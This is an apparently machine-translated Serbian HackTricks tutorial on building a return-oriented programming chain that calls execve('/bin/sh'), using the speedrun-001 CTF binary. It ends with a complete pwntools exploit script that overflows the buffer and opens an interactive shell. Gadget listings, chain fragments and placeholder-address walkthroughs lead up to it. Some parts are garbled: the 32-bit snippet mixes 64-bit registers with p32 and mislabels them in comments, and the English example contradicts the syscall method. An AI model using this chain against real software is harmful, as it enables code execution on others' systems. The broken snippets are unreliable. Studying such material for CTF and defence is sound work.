# ROP - pozovi sys\_execve

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Da biste pripremili poziv za **syscall**, potrebna je slede캖a konfiguracija:

* `rax: 59 Specifikacija sys_execve`
* `rdi: ptr na "/bin/sh" specifikacija fajla za izvr코avanje`
* `rsi: 0 specifikacija da nema prosle캠enih argumenata`
* `rdx: 0 specifikacija da nema prosle캠enih okru쬰njskih promenljivih`

Dakle, osnovno je potrebno negde napisati string `/bin/sh` i zatim izvr코iti `syscall` (vode캖i ra캜una o potrebnoj popuni za kontrolu steka).

## Kontrola registara

Hajde da po캜nemo sa pronala쬰njem **kako kontrolisati te registre**:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Sa ovim adresama je mogu캖e **upisati sadr쬬j na stek i u캜itati ga u registre**.

## Upisivanje stringa

### Upisiva캜ka memorija

Prvo morate prona캖i upisivo mesto u memoriji.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Upisivanje Stringa

Zatim morate prona캖i na캜in da upi코ete proizvoljni sadr쬬j na ovoj adresi
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 bita

##### ROP (Return Oriented Programming) - execv

ROP (Return Oriented Programming) je tehnika koja se koristi za izvr코avanje koda u ciljnom sistemu koriste캖i postoje캖i izvr코ni kod. U ovom slu캜aju, koristimo ROP za izvr코avanje funkcije `execv` u ciljnom sistemu.

Funkcija `execv` se koristi za izvr코avanje programa u Linux operativnom sistemu. Ona prima dva argumenta: putanju do programa koji 쬰limo da izvr코imo i niz argumenata koji se prosle캠uju tom programu.

Da bismo koristili ROP za izvr코avanje funkcije `execv`, prvo moramo prona캖i odgovaraju캖e ROP gagdete. ROP gagdeti su mali delovi izvr코nog koda koji se zavr코avaju sa `ret` instrukcijom. Kombinacijom ovih gagdeta mo쬰mo konstruisati lanac koji 캖e izvr코iti 쬰ljenu funkciju.

U ovom slu캜aju, koristimo ROP gagdete za postavljanje argumenata funkcije `execv` na odgovaraju캖e vrednosti. Zatim, koristimo ROP gagdete za pozivanje same funkcije `execv`.

Kada konstrui코emo ROP lanac, moramo voditi ra캜una o redosledu argumenata i njihovim vrednostima. Tako캠e, moramo biti sigurni da su adrese ROP gagdeta ta캜ne i da se nalaze u memoriji ciljnog sistema.

Nakon 코to konstrui코emo ROP lanac, mo쬰mo ga ubaciti u ranjivu aplikaciju i izvr코iti napad. Kada se ROP lanac izvr코i, funkcija `execv` 캖e biti pozvana i program koji smo naveli 캖e biti izvr코en na ciljnom sistemu.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bita

##### ROP (Return Oriented Programming) - Izvr코avanje sistemskog poziva execv

ROP (Return Oriented Programming) je tehnika koja se koristi za izvr코avanje zlonamernog koda u programu bez kori코캖enja tradicionalnih metoda ubrizgavanja koda. U ovom slu캜aju, koristi캖emo ROP za izvr코avanje sistemskog poziva execv u 64-bitnom Linux okru쬰nju.

Sistemski poziv execv se koristi za pokretanje novog procesa sa zadatim izvr코nim fajlom. Da bismo izvr코ili ovaj sistemski poziv pomo캖u ROP-a, koristimo slede캖e korake:

1. Pronalazimo odgovaraju캖e ROP gadgete - male delove koda koji se nalaze u programu i koji zavr코avaju sa instrukcijom "ret" (povratak). Ovi gadgeti 캖e nam omogu캖iti da izvr코imo sistemski poziv execv.

2. Kreiramo ROP lanac - niz ROP gadgeta koji 캖e se izvr코iti jedan za drugim kako bi se postigao 쬰ljeni cilj. U ovom slu캜aju, cilj nam je izvr코avanje sistemskog poziva execv.

3. Postavljamo argumente - postavljamo argumente za sistemski poziv execv, kao 코to su putanja do izvr코nog fajla i argumenti koje 쬰limo da prosledimo novom procesu.

4. Izvr코avamo ROP lanac - pokre캖emo ROP lanac kako bismo izvr코ili sistemski poziv execv i pokrenuli novi proces.

Ova tehnika zahteva detaljno prou캜avanje ciljnog programa i identifikaciju odgovaraju캖ih ROP gadgeta. Tako캠e je va쬹o da se pravilno postave argumenti za sistemski poziv execv kako bi se postigao 쬰ljeni rezultat.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Primer

### Description

In this example, we will demonstrate how to use Return-Oriented Programming (ROP) and the `execv` syscall to execute a shell command on a Linux system.

### Requirements

To follow along with this example, you will need:

- A Linux system
- Basic knowledge of assembly language and C programming

### Steps

1. Find the address of the `execv` function in the target binary. This can be done using tools like `objdump` or `readelf`.

2. Identify gadgets in the target binary that can be used for ROP. Gadgets are short sequences of instructions that end with a `ret` instruction.

3. Craft a ROP chain that will call the `execv` function with the desired shell command as an argument. The ROP chain should include gadgets that set up the necessary registers for the `execv` syscall.

4. Find the address of the shell command string in the target binary. This can be done using tools like `objdump` or `readelf`.

5. Build the payload by concatenating the ROP chain and the address of the shell command string.

6. Execute the payload by overflowing a buffer in the target binary and redirecting the program's control flow to the ROP chain.

### Example

Let's assume we have a vulnerable program that reads user input into a buffer without proper bounds checking. We want to exploit this vulnerability to execute the `ls` command.

1. Find the address of the `execv` function in the target binary. Let's say the address is `0xdeadbeef`.

2. Identify gadgets in the target binary that can be used for ROP. Let's say we find two gadgets:
   - `pop rdi; ret` at address `0xcafebabe`
   - `pop rsi; ret` at address `0xfeedface`

3. Craft a ROP chain that will call the `execv` function with the desired shell command as an argument. The ROP chain would look like this:
   - `pop rdi; ret` gadget
   - address of the shell command string
   - `pop rsi; ret` gadget
   - 0 (null value for the second argument)
   - address of the `execv` function

4. Find the address of the shell command string in the target binary. Let's say the address is `0xabcdef01`.

5. Build the payload by concatenating the ROP chain and the address of the shell command string:
   ```
   payload = rop_chain + shell_command_address
   ```

6. Execute the payload by overflowing a buffer in the target binary and redirecting the program's control flow to the ROP chain. This can be done by providing input that exceeds the buffer's size and overwrites the return address with the address of the ROP chain.

When the vulnerable program returns, it will execute the ROP chain, which will set up the necessary registers and call the `execv` function with the shell command as an argument. This will result in the execution of the desired shell command (`ls` in this case).
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Reference

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
